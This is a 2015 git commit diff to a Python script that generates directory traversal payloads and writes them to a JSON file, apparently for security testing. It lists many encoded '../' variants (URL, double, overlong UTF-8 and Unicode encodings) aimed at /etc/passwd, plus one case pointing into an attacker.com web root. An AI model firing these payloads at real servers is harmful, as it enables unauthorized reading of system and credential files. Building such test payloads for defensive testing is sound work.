7e1f0cc1f41204331bf995e83cc2adde69157116
Keitarosama <keithlim18@hotmail.com>
2015-04-21 15:22:51 +0800

    Changed the Python file for creating Payloads
    Removed MS method of directory traversals ( \ )
    Removed as many "repeated" test cases as possible
    Removed extra-long test cases as they don't seem feasible or within our
    scope

--- data/createpayload.py
+++ data/createpayload.py
@@ -6,39 +6,79 @@ curr_file_path = ""
 #file = open("payload.txt","w")
 #file.write("h")
 
-with open("payload.txt","w") as payload_file:
+with open("payloads.json","w") as payload_file:
+	#Opening of JSON
+	payload_file.write('[\n');
+
+
 	#Contains the various types of directory pathing
 	#%2f = / || %2e = . || %252f = / || '%255c' = \
-	list_of_postfix = ['/etc/', '/etc/passwd', '%2fetc%2fpasswd','/etc/passwd%00index.html', '/etc/passwd;index.html','//etc//passwd']
-	list_of_prefix = ['../', '..%2f', '%2e%2e/','%2e%2e%2f','..%252f/','%252e%252e/','%252e%252e%252f','..\\'
-	,'..%255c','%252e%252e\\','..%5c','%2e%2e\\', '%2e%2e%5c', '%252e%252e\\', '%252e%252e%255c','..%c0%af',
+	list_of_postfix = ['','/etc/', '/etc/passwd', '%2fetc%2fpasswd','/etc/passwd%00index.html', '/etc/passwd;index.html','//etc//passwd']
+	list_of_prefix = ['../', '..%2f', '%2e%2e/','%2e%2e%2f','..%252f/','%252e%252e/','%252e%252e%252f','..%c0%af',
 	'%c0%ae%c0%ae/','%c0%ae%c0%ae%c0%af','..%25c0%25af','%25c0%25ae%25c0%25ae/','%25c0%25ae%25c0%25ae%25c0%25af'
-	,'..%c1%9c','%c0%ae%c0%ae\\','%c0%ae%c0%ae%c1%9c','..%25c1%259c','%25c0%25ae%25c0%25ae\\','%25c0%25ae%25c0%25ae%25c1%259c'
 	,'..%%32%66','%%32%65%%32%65/','%%32%65%%32%65%%32%66','..%%35%63','%%32%65%%32%65/','%%32%65%%32%65%%35%63',
-	'/..\\','.../','..././','...\\','..../','....\\','..%u2215','%uff0e%uff0e/','%uff0e%uff0e%u2215','..%u2216','..%uEFC8','..%uF025'
-	,'%uff0e%uff0e\\','%uff0e%uff0e%u2216','..0x2f','0x2e0x2e/','0x2e0x2e0x2f','..0x5c','0x2e0x2e\\','0x2e0x2e0x5c','..%c0%2f'
-	,'%c0%2e%c0%2e/','%c0%2e%c0%2e%c0%2f','..%c0%5c','%c0%2e%c0%2e\\','%c0%2e%c0%2e%c0%5c','///%2e%2e%2f','\\\\\\%2e%2e%5c'
-	,'..//','..\\\\','..\\\\\\','./\\/./','.\\/\\.\\','./../','.\\..\\','.//..//','.\\\\..\\\\']
+	'/..\\','.../','..././','..../','..%u2215','%uff0e%uff0e/','%uff0e%uff0e%u2215','..%u2216','..%uEFC8','..%uF025','..0x2f','0x2e0x2e/','0x2e0x2e0x2f','..%c0%2f'
+	,'%c0%2e%c0%2e/','%c0%2e%c0%2e%c0%2f','///%2e%2e%2f','..//','./\\/./','.\\/\\.\\','./../','.//..//']
 
+	#Print just the postfix
+	for post_style in list_of_postfix:
+		payload_file.write('["'+post_style+'"],\n')
 
+	#For extended file paths
 	for post_style in list_of_postfix:
 		for pre_style in list_of_prefix:
-			curr_file_path = post_style  + "\n";
-			for times in range(0,10):
+			curr_file_path = post_style;
+			for times in range(0,15):
 				curr_file_path = pre_style + curr_file_path;
-				payload_file.write(curr_file_path)
+			#Start from longest path
+			payload_file.write('["'+curr_file_path+'"],\n')
+			#Reduce
+			for times in range(0,14):
+				curr_file_path = curr_file_path[len(pre_style):]
+				payload_file.write('["'+curr_file_path+'"],\n')
+				if curr_file_path == "":
+					break;
+
 
 	#Long Prefix
-	list_of_long_prefix = ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/'
-	, 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
-	'..........................................................................',
-	'././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././',
-	'.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\']
+	#list_of_long_prefix = ['AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/'
+	#, 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+	#'..........................................................................',
+	#'././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././',
+	#'.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\']
 
-	for long_prefix in list_of_long_prefix:
-		for post_style in list_of_postfix:
-			for pre_style in list_of_prefix:
-				curr_file_path = long_prefix
-				for times in range(0,10):
-					curr_file_path = curr_file_path+pre_style
-					payload_file.write(curr_file_path+post_style)
+	#for long_prefix in list_of_long_prefix:
+	#	for post_style in list_of_postfix:
+	#		for pre_style in list_of_prefix:
+	#			curr_file_path = long_prefix
+	#			for times in range(0,15):
+	#				curr_file_path = curr_file_path+pre_style
+				#Start from longest path
+	#			payload_file.write('["'+curr_file_path+post_style+'"],\n')
+				#Reduce
+	#			for times in range(0,15):
+	#				curr_file_path = curr_file_path[:(len(curr_file_path) - len(pre_style))]
+	#				payload_file.write('["'+curr_file_path+post_style+'"],\n')
+
+	#2-part Inputs
+	list_of_second_input = ['passwd']
+
+	for second_input in list_of_second_input:
+		for pre_style in list_of_prefix:
+			curr_file_path = pre_style;
+			for times in range(0,15):
+				curr_file_path = pre_style + curr_file_path;
+			payload_file.write('["'+curr_file_path+'", "'+second_input+'"],\n')
+			for times in range(0,14):
+				curr_file_path = curr_file_path[len(pre_style):]
+				payload_file.write('["'+curr_file_path+'", "'+second_input+'"],\n')
+				if curr_file_path == "":
+					break;
+
+
+
+	#Special Cases
+	payload_file.write('["../../../../../../../../var/www/attacker.com/public_html/", "image.jpg"]\n')
+
+	#Closing
+	payload_file.write(']')
